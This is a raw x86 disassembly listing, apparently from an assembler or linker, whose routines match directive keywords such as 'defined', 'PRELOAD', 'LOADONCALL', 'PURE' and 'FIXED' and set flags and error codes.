  4047a4:	75 2c                	jne    0x4047d2
  4047a6:	f6 05 c6 ab 40 00 08 	testb  $0x8,0x40abc6
  4047ad:	74 17                	je     0x4047c6
  4047af:	ba 50 08 00 04       	mov    $0x4000850,%edx
  4047b4:	3d ff 7f 00 00       	cmp    $0x7fff,%eax
  4047b9:	77 3b                	ja     0x4047f6
  4047bb:	ba 37 08 00 04       	mov    $0x4000837,%edx
  4047c0:	09 c0                	or     %eax,%eax
  4047c2:	74 32                	je     0x4047f6
  4047c4:	eb 0c                	jmp    0x4047d2
  4047c6:	ba 63 08 00 04       	mov    $0x4000863,%edx
  4047cb:	3d ff ff 00 00       	cmp    $0xffff,%eax
  4047d0:	77 24                	ja     0x4047f6
  4047d2:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  4047d9:	00 00 00 
  4047dc:	80 25 c6 ab 40 00 f5 	andb   $0xf5,0x40abc6
  4047e3:	80 25 c5 ab 40 00 fe 	andb   $0xfe,0x40abc5
  4047ea:	c3                   	ret
  4047eb:	31 c0                	xor    %eax,%eax
  4047ed:	f6 05 c5 ab 40 00 01 	testb  $0x1,0x40abc5
  4047f4:	75 dc                	jne    0x4047d2
  4047f6:	80 25 c6 ab 40 00 f5 	andb   $0xf5,0x40abc6
  4047fd:	80 25 c5 ab 40 00 fe 	andb   $0xfe,0x40abc5
  404804:	f9                   	stc
  404805:	c3                   	ret
  404806:	89 d8                	mov    %ebx,%eax
  404808:	c1 e0 08             	shl    $0x8,%eax
  40480b:	89 da                	mov    %ebx,%edx
  40480d:	4a                   	dec    %edx
  40480e:	78 16                	js     0x404826
  404810:	8a 04 16             	mov    (%esi,%edx,1),%al
  404813:	c1 e0 08             	shl    $0x8,%eax
  404816:	4a                   	dec    %edx
  404817:	78 12                	js     0x40482b
  404819:	8a 04 16             	mov    (%esi,%edx,1),%al
  40481c:	c1 e0 08             	shl    $0x8,%eax
  40481f:	4a                   	dec    %edx
  404820:	78 0e                	js     0x404830
  404822:	8a 04 16             	mov    (%esi,%edx,1),%al
  404825:	c3                   	ret
  404826:	b0 20                	mov    $0x20,%al
  404828:	c1 e0 08             	shl    $0x8,%eax
  40482b:	b0 20                	mov    $0x20,%al
  40482d:	c1 e0 08             	shl    $0x8,%eax
  404830:	b0 20                	mov    $0x20,%al
  404832:	c3                   	ret
  404833:	50                   	push   %eax
  404834:	57                   	push   %edi
  404835:	8b 7a 08             	mov    0x8(%edx),%edi
  404838:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  40483b:	8b 75 fc             	mov    -0x4(%ebp),%esi
  40483e:	8a 06                	mov    (%esi),%al
  404840:	38 07                	cmp    %al,(%edi)
  404842:	75 05                	jne    0x404849
  404844:	46                   	inc    %esi
  404845:	47                   	inc    %edi
  404846:	4b                   	dec    %ebx
  404847:	75 f5                	jne    0x40483e
  404849:	5f                   	pop    %edi
  40484a:	58                   	pop    %eax
  40484b:	c3                   	ret
  40484c:	51                   	push   %ecx
  40484d:	8b 0d 64 aa 40 00    	mov    0x40aa64,%ecx
  404853:	3d 00 00 00 01       	cmp    $0x1000000,%eax
  404858:	76 28                	jbe    0x404882
  40485a:	eb 21                	jmp    0x40487d
  40485c:	51                   	push   %ecx
  40485d:	3d 00 00 00 01       	cmp    $0x1000000,%eax
  404862:	76 1e                	jbe    0x404882
  404864:	89 d1                	mov    %edx,%ecx
  404866:	8b 15 68 aa 40 00    	mov    0x40aa68,%edx
  40486c:	eb 0f                	jmp    0x40487d
  40486e:	39 ca                	cmp    %ecx,%edx
  404870:	72 10                	jb     0x404882
  404872:	39 02                	cmp    %eax,(%edx)
  404874:	75 07                	jne    0x40487d
  404876:	e8 b8 ff ff ff       	call   0x404833
  40487b:	74 08                	je     0x404885
  40487d:	83 ea 20             	sub    $0x20,%edx
  404880:	eb ec                	jmp    0x40486e
  404882:	f9                   	stc
  404883:	eb 07                	jmp    0x40488c
  404885:	83 7a 0c 06          	cmpl   $0x6,0xc(%edx)
  404889:	74 f7                	je     0x404882
  40488b:	f8                   	clc
  40488c:	59                   	pop    %ecx
  40488d:	c3                   	ret
  40488e:	55                   	push   %ebp
  40488f:	89 e5                	mov    %esp,%ebp
  404891:	83 ec 20             	sub    $0x20,%esp
  404894:	89 75 fc             	mov    %esi,-0x4(%ebp)
  404897:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40489a:	e8 67 ff ff ff       	call   0x404806
  40489f:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4048a2:	8b 15 64 aa 40 00    	mov    0x40aa64,%edx
  4048a8:	e8 af ff ff ff       	call   0x40485c
  4048ad:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4048b0:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4048b3:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  4048b6:	89 ec                	mov    %ebp,%esp
  4048b8:	5d                   	pop    %ebp
  4048b9:	c3                   	ret
  4048ba:	80 0d c9 ab 40 00 20 	orb    $0x20,0x40abc9
  4048c1:	e8 43 fb ff ff       	call   0x404409
  4048c6:	72 1d                	jb     0x4048e5
  4048c8:	74 1b                	je     0x4048e5
  4048ca:	e8 34 fa ff ff       	call   0x404303
  4048cf:	72 0f                	jb     0x4048e0
  4048d1:	75 0d                	jne    0x4048e0
  4048d3:	e8 b6 ff ff ff       	call   0x40488e
  4048d8:	9f                   	lahf
  4048d9:	25 00 01 00 00       	and    $0x100,%eax
  4048de:	eb 06                	jmp    0x4048e6
  4048e0:	ba 2e 08 00 04       	mov    $0x400082e,%edx
  4048e5:	f9                   	stc
  4048e6:	c3                   	ret
  4048e7:	80 0d c9 ab 40 00 20 	orb    $0x20,0x40abc9
  4048ee:	e8 16 fb ff ff       	call   0x404409
  4048f3:	72 24                	jb     0x404919
  4048f5:	74 22                	je     0x404919
  4048f7:	e8 07 fa ff ff       	call   0x404303
  4048fc:	72 16                	jb     0x404914
  4048fe:	75 14                	jne    0x404914
  404900:	e8 89 ff ff ff       	call   0x40488e
  404905:	72 07                	jb     0x40490e
  404907:	c7 42 0c 06 00 00 00 	movl   $0x6,0xc(%edx)
  40490e:	ba 3d 08 00 00       	mov    $0x83d,%edx
  404913:	c3                   	ret
  404914:	ba 2f 08 00 04       	mov    $0x400082f,%edx
  404919:	f9                   	stc
  40491a:	c3                   	ret
  40491b:	39 05 b8 aa 40 00    	cmp    %eax,0x40aab8
  404921:	8a 1d c1 ab 40 00    	mov    0x40abc1,%bl
  404927:	b7 01                	mov    $0x1,%bh
  404929:	72 06                	jb     0x404931
  40492b:	b7 02                	mov    $0x2,%bh
  40492d:	77 02                	ja     0x404931
  40492f:	b7 04                	mov    $0x4,%bh
  404931:	31 c0                	xor    %eax,%eax
  404933:	84 df                	test   %bl,%bh
  404935:	74 01                	je     0x404938
  404937:	40                   	inc    %eax
  404938:	c3                   	ret
  404939:	e8 ca f1 ff ff       	call   0x403b08
  40493e:	73 04                	jae    0x404944
  404940:	31 c0                	xor    %eax,%eax
  404942:	eb 50                	jmp    0x404994
  404944:	e8 45 f2 ff ff       	call   0x403b8e
  404949:	72 11                	jb     0x40495c
  40494b:	75 53                	jne    0x4049a0
  40494d:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  404954:	00 00 00 
  404957:	a3 b8 aa 40 00       	mov    %eax,0x40aab8
  40495c:	80 0d c9 ab 40 00 20 	orb    $0x20,0x40abc9
  404963:	e8 a1 fa ff ff       	call   0x404409
  404968:	72 36                	jb     0x4049a0
  40496a:	e8 52 f8 ff ff       	call   0x4041c1
  40496f:	b8 01 00 00 00       	mov    $0x1,%eax
  404974:	72 1e                	jb     0x404994
  404976:	88 1d c1 ab 40 00    	mov    %bl,0x40abc1
  40497c:	80 0d c9 ab 40 00 20 	orb    $0x20,0x40abc9
  404983:	ba 3c 08 00 00       	mov    $0x83c,%edx
  404988:	e8 6a fc ff ff       	call   0x4045f7
  40498d:	72 10                	jb     0x40499f
  40498f:	e8 87 ff ff ff       	call   0x40491b
  404994:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  40499b:	00 00 00 
  40499e:	f8                   	clc
  40499f:	c3                   	ret
  4049a0:	8b 15 d0 aa 40 00    	mov    0x40aad0,%edx
  4049a6:	f9                   	stc
  4049a7:	c3                   	ret
  4049a8:	80 25 c8 ab 40 00 df 	andb   $0xdf,0x40abc8
  4049af:	e8 1a e4 ff ff       	call   0x402dce
  4049b4:	74 1e                	je     0x4049d4
  4049b6:	80 3f 21             	cmpb   $0x21,(%edi)
  4049b9:	75 17                	jne    0x4049d2
  4049bb:	80 0d c8 ab 40 00 20 	orb    $0x20,0x40abc8
  4049c2:	80 25 c8 ab 40 00 fb 	andb   $0xfb,0x40abc8
  4049c9:	47                   	inc    %edi
  4049ca:	49                   	dec    %ecx
  4049cb:	e8 fe e3 ff ff       	call   0x402dce
  4049d0:	74 02                	je     0x4049d4
  4049d2:	f8                   	clc
  4049d3:	c3                   	ret
  4049d4:	f9                   	stc
  4049d5:	c3                   	ret
  4049d6:	83 f9 07             	cmp    $0x7,%ecx
  4049d9:	72 20                	jb     0x4049fb
  4049db:	81 3f 64 65 66 69    	cmpl   $0x69666564,(%edi)
  4049e1:	75 09                	jne    0x4049ec
  4049e3:	81 7f 03 69 6e 65 64 	cmpl   $0x64656e69,0x3(%edi)
  4049ea:	74 0f                	je     0x4049fb
  4049ec:	81 3f 44 45 46 49    	cmpl   $0x49464544,(%edi)
  4049f2:	75 07                	jne    0x4049fb
  4049f4:	81 7f 03 49 4e 45 44 	cmpl   $0x44454e49,0x3(%edi)
  4049fb:	75 0a                	jne    0x404a07
  4049fd:	83 c7 07             	add    $0x7,%edi
  404a00:	83 e9 07             	sub    $0x7,%ecx
  404a03:	74 04                	je     0x404a09
  404a05:	31 d2                	xor    %edx,%edx
  404a07:	f8                   	clc
  404a08:	c3                   	ret
  404a09:	e8 36 e3 ff ff       	call   0x402d44
  404a0e:	75 c6                	jne    0x4049d6
  404a10:	ba 60 18 00 00       	mov    $0x1860,%edx
  404a15:	f9                   	stc
  404a16:	c3                   	ret
  404a17:	80 0d c9 ab 40 00 20 	orb    $0x20,0x40abc9
  404a1e:	e8 e6 f9 ff ff       	call   0x404409
  404a23:	72 1f                	jb     0x404a44
  404a25:	74 1d                	je     0x404a44
  404a27:	e8 d7 f8 ff ff       	call   0x404303
  404a2c:	72 16                	jb     0x404a44
  404a2e:	74 0d                	je     0x404a3d
  404a30:	e8 97 f1 ff ff       	call   0x403bcc
  404a35:	8b 15 d0 aa 40 00    	mov    0x40aad0,%edx
  404a3b:	eb 08                	jmp    0x404a45
  404a3d:	e8 f7 fe ff ff       	call   0x404939
  404a42:	eb 01                	jmp    0x404a45
  404a44:	f9                   	stc
  404a45:	c3                   	ret
  404a46:	e8 83 e3 ff ff       	call   0x402dce
  404a4b:	74 5a                	je     0x404aa7
  404a4d:	e8 b1 f8 ff ff       	call   0x404303
  404a52:	72 52                	jb     0x404aa6
  404a54:	75 6d                	jne    0x404ac3
  404a56:	e8 64 e2 ff ff       	call   0x402cbf
  404a5b:	75 66                	jne    0x404ac3
  404a5d:	be ec ab 40 00       	mov    $0x40abec,%esi
  404a62:	b8 7c d6 40 00       	mov    $0x40d67c,%eax
  404a67:	e8 12 37 00 00       	call   0x40817e
  404a6c:	72 55                	jb     0x404ac3
  404a6e:	3c 80                	cmp    $0x80,%al
  404a70:	72 64                	jb     0x404ad6
  404a72:	3c ff                	cmp    $0xff,%al
  404a74:	74 14                	je     0x404a8a
  404a76:	e8 b4 f7 ff ff       	call   0x40422f
  404a7b:	72 2a                	jb     0x404aa7
  404a7d:	2c 80                	sub    $0x80,%al
  404a7f:	75 28                	jne    0x404aa9
  404a81:	e8 ca e7 ff ff       	call   0x403250
  404a86:	72 1e                	jb     0x404aa6
  404a88:	74 06                	je     0x404a90
  404a8a:	e8 55 e2 ff ff       	call   0x402ce4
  404a8f:	c3                   	ret
  404a90:	8b 4e 30             	mov    0x30(%esi),%ecx
  404a93:	8b 7e 18             	mov    0x18(%esi),%edi
  404a96:	c7 05 0c ab 40 00 01 	movl   $0x1,0x40ab0c
  404a9d:	00 00 00 
  404aa0:	ff 05 00 ab 40 00    	incl   0x40ab00
  404aa6:	c3                   	ret
  404aa7:	f8                   	clc
  404aa8:	c3                   	ret
  404aa9:	fe c8                	dec    %al
  404aab:	75 0b                	jne    0x404ab8
  404aad:	e8 35 fe ff ff       	call   0x4048e7
  404ab2:	e8 2d e2 ff ff       	call   0x402ce4
  404ab7:	c3                   	ret
  404ab8:	e8 8f 39 00 00       	call   0x40844c
  404abd:	e8 22 e2 ff ff       	call   0x402ce4
  404ac2:	c3                   	ret
  404ac3:	ff 0d 14 ab 40 00    	decl   0x40ab14
  404ac9:	ff 05 18 ab 40 00    	incl   0x40ab18
  404acf:	ba 3b 08 00 00       	mov    $0x83b,%edx
  404ad4:	eb 3c                	jmp    0x404b12
  404ad6:	fe c8                	dec    %al
  404ad8:	75 3a                	jne    0x404b14
  404ada:	e8 86 f7 ff ff       	call   0x404265
  404adf:	72 31                	jb     0x404b12
  404ae1:	0f 84 80 00 00 00    	je     0x404b67
  404ae7:	e8 bc fe ff ff       	call   0x4049a8
  404aec:	72 24                	jb     0x404b12
  404aee:	e8 e3 fe ff ff       	call   0x4049d6
  404af3:	72 1d                	jb     0x404b12
  404af5:	0f 84 82 00 00 00    	je     0x404b7d
  404afb:	c7 05 d0 aa 40 00 27 	movl   $0x4000827,0x40aad0
  404b02:	08 00 04 
  404b05:	e8 0d ff ff ff       	call   0x404a17
  404b0a:	72 06                	jb     0x404b12
  404b0c:	e8 b3 f7 ff ff       	call   0x4042c4
  404b11:	c3                   	ret
  404b12:	f9                   	stc
  404b13:	c3                   	ret
  404b14:	fe c8                	dec    %al
  404b16:	75 30                	jne    0x404b48
  404b18:	e8 28 f7 ff ff       	call   0x404245
  404b1d:	72 f3                	jb     0x404b12
  404b1f:	74 46                	je     0x404b67
  404b21:	e8 82 fe ff ff       	call   0x4049a8
  404b26:	72 ea                	jb     0x404b12
  404b28:	e8 a9 fe ff ff       	call   0x4049d6
  404b2d:	72 e3                	jb     0x404b12
  404b2f:	74 4c                	je     0x404b7d
  404b31:	c7 05 d0 aa 40 00 2d 	movl   $0x400082d,0x40aad0
  404b38:	08 00 04 
  404b3b:	e8 d7 fe ff ff       	call   0x404a17
  404b40:	72 d0                	jb     0x404b12
  404b42:	e8 7d f7 ff ff       	call   0x4042c4
  404b47:	c3                   	ret
  404b48:	fe c8                	dec    %al
  404b4a:	75 1d                	jne    0x404b69
  404b4c:	e8 f4 f6 ff ff       	call   0x404245
  404b51:	72 bf                	jb     0x404b12
  404b53:	74 12                	je     0x404b67
  404b55:	80 25 c8 ab 40 00 df 	andb   $0xdf,0x40abc8
  404b5c:	b8 01 00 00 00       	mov    $0x1,%eax
  404b61:	e8 5e f7 ff ff       	call   0x4042c4
  404b66:	c3                   	ret
  404b67:	f8                   	clc
  404b68:	c3                   	ret
  404b69:	fe c8                	dec    %al
  404b6b:	75 22                	jne    0x404b8f
  404b6d:	e8 f3 f6 ff ff       	call   0x404265
  404b72:	72 1a                	jb     0x404b8e
  404b74:	74 18                	je     0x404b8e
  404b76:	e8 2d fe ff ff       	call   0x4049a8
  404b7b:	72 11                	jb     0x404b8e
  404b7d:	e8 38 fd ff ff       	call   0x4048ba
  404b82:	72 0a                	jb     0x404b8e
  404b84:	35 00 01 00 00       	xor    $0x100,%eax
  404b89:	e8 36 f7 ff ff       	call   0x4042c4
  404b8e:	c3                   	ret
  404b8f:	fe c8                	dec    %al
  404b91:	75 1d                	jne    0x404bb0
  404b93:	e8 cd f6 ff ff       	call   0x404265
  404b98:	72 f4                	jb     0x404b8e
  404b9a:	74 f2                	je     0x404b8e
  404b9c:	e8 07 fe ff ff       	call   0x4049a8
  404ba1:	72 eb                	jb     0x404b8e
  404ba3:	e8 12 fd ff ff       	call   0x4048ba
  404ba8:	72 e4                	jb     0x404b8e
  404baa:	e8 15 f7 ff ff       	call   0x4042c4
  404baf:	c3                   	ret
  404bb0:	f6 05 c9 ab 40 00 02 	testb  $0x2,0x40abc9
  404bb7:	74 0e                	je     0x404bc7
  404bb9:	8b 15 88 aa 40 00    	mov    0x40aa88,%edx
  404bbf:	66 ff 4a 34          	decw   0x34(%edx)
  404bc3:	79 a2                	jns    0x404b67
  404bc5:	eb 08                	jmp    0x404bcf
  404bc7:	ff 0d f4 aa 40 00    	decl   0x40aaf4
  404bcd:	79 98                	jns    0x404b67
  404bcf:	ba 26 18 00 04       	mov    $0x4001826,%edx
  404bd4:	f9                   	stc
  404bd5:	c3                   	ret
  404bd6:	80 fb 07             	cmp    $0x7,%bl
  404bd9:	75 13                	jne    0x404bee
  404bdb:	81 3e 50 52 45 4c    	cmpl   $0x4c455250,(%esi)
  404be1:	75 2a                	jne    0x404c0d
  404be3:	81 7e 03 4c 4f 41 44 	cmpl   $0x44414f4c,0x3(%esi)
  404bea:	75 21                	jne    0x404c0d
  404bec:	f8                   	clc
  404bed:	c3                   	ret
  404bee:	80 fb 0a             	cmp    $0xa,%bl
  404bf1:	75 1a                	jne    0x404c0d
  404bf3:	81 3e 4c 4f 41 44    	cmpl   $0x44414f4c,(%esi)
  404bf9:	75 12                	jne    0x404c0d
  404bfb:	81 7e 04 4f 4e 43 41 	cmpl   $0x41434e4f,0x4(%esi)
  404c02:	75 09                	jne    0x404c0d
  404c04:	81 7e 06 43 41 4c 4c 	cmpl   $0x4c4c4143,0x6(%esi)
  404c0b:	74 df                	je     0x404bec
  404c0d:	80 fb 04             	cmp    $0x4,%bl
  404c10:	75 0a                	jne    0x404c1c
  404c12:	81 3e 50 55 52 45    	cmpl   $0x45525550,(%esi)
  404c18:	74 d2                	je     0x404bec
  404c1a:	eb 72                	jmp    0x404c8e
  404c1c:	80 fb 05             	cmp    $0x5,%bl
  404c1f:	75 10                	jne    0x404c31
  404c21:	81 3e 46 49 58 45    	cmpl   $0x45584946,(%esi)
  404c27:	75 65                	jne    0x404c8e
  404c29:	80 7e 04 44          	cmpb   $0x44,0x4(%esi)
  404c2d:	74 bd                	je     0x404bec
  404c2f:	eb 5d                	jmp    0x404c8e
  404c31:	80 fb 06             	cmp    $0x6,%bl
  404c34:	75 13                	jne    0x404c49
  404c36:	81 3e 49 4d 50 55    	cmpl   $0x55504d49,(%esi)
  404c3c:	75 50                	jne    0x404c8e
